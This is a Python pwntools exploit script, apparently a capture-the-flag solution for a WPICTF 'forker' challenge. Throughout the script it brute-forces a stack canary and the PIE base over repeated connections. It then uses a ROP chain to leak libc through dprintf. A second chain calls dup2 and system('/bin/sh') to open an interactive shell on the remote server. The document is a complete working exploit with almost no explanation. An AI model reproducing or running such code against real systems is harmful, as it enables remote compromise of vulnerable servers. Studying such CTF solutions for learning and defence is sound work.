from pwn import *
import sys

def rem(lvl):
    while True:
        try:
            return remote('forker3.wpictf.xyz', 31338, level=lvl, timeout=1)
            #return remote('localhost', 31337, level=lvl)
        except:
            continue


def attempt(data):
    """
    attempt throwing data. Returns whether the binary crashed
    """
    with rem('error') as r:
        r.recvuntil(':')
        r.sendline(data)
        try:
            r.recvuntil('!')
            return False
        except EOFError: # binary crashed, no line
            return True

def trial(ttt):
    known, value = ttt
    if value == 10:
        return False, -1
    pad = 'A'*0x48
    trial_cookie = ''.join(map(chr, known + [value]))
    if not attempt(pad + trial_cookie):
        return True, value
    return False, -1

def brute_next_cookie_byte(known):
    for success, value in map(trial, [(known, x) for x in range(0x100)]):
        if success:
            return value
    raise ValueError('could not find byte of cookie! D:')

def brute_cookie():
    known = [0, 176, 151, 150, 140, 88, 251, 246]
    #known = [0, 182, 24, 91, 26, 83, 162, 142]
    while len(known) < 8:
        next_byte = brute_next_cookie_byte(known)
        known.append(next_byte)
        print('Found cookie byte: {}, known = {}'.format(next_byte, known))
    return known

cookie = brute_cookie()
print(cookie)

def pie_trial(ttt):
    known, value = ttt
    if value == 10:
        return False, -1
    pad = 'A'*0x48 + ''.join(map(chr, cookie)) + 'B'*0x10 + p64(4) + 'B'*0x10
    trial_cookie = ''.join(map(chr, known + [value]))
    if not attempt(pad + trial_cookie):
        return True, value
    return False, -1

def brute_next_pie_byte(known):
    for success, value in map(pie_trial, [(known, x) for x in range(0x100)]):
        if success:
            return value
    raise ValueError('could not find byte of PIE! D:')

def brute_pie():
    known = [0xf1]
    while len(known) < 8:
        next_byte = brute_next_pie_byte(known)
        known.append(next_byte)
        print('Found PIE byte: {}, known = {}'.format(next_byte, known))
    return known

pie = brute_pie()
print(pie)

e = ELF('./f3/forker.level3')
e.address = u64(''.join(map(chr, pie))) - 0x9f1
print(hex(e.address))

pop_rdi = e.address + 0xc93
pop_rsi_r15 = e.address + 0xc91
pop_rsp_r13 = e.address + 0xc21

fd = 4

rop = ''.join(map(p64, [
    # Leak puts
    pop_rdi,
    fd,
    pop_rsi_r15,
    e.got['puts'],
    0xdeadbeef,
    e.symbols['dprintf'],

    # jump back to check_password
    pop_rdi,
    fd,
    e.symbols['check_password'],
]))

with rem('debug') as r:
    r.recvuntil(':')
    r.sendline('A'*0x48 + ''.join(map(chr, cookie)) + 'B'*0x28 + rop)

    puts = u64(r.recvn(6) + '\x00'*2)
    libc = ELF('libc-2.26.so')
    libc.address = puts - libc.symbols['puts']

    print(hex(libc.address))

rop2 = ''.join(map(p64, [
    pop_rdi,
    fd,
    pop_rsi_r15,
    0,
    0xdeadbeef,
    libc.symbols['dup2'],

    pop_rdi,
    fd,
    pop_rsi_r15,
    1,
    0xdeadbeef,
    libc.symbols['dup2'],

    pop_rdi,
    next(libc.search('/bin/sh\x00')),
    libc.symbols['system'],
]))

with rem('debug') as r:
    r.recvuntil(':')
    r.sendline('A'*0x48 + ''.join(map(chr, cookie)) + 'B'*0x28 + rop2)

    r.interactive()
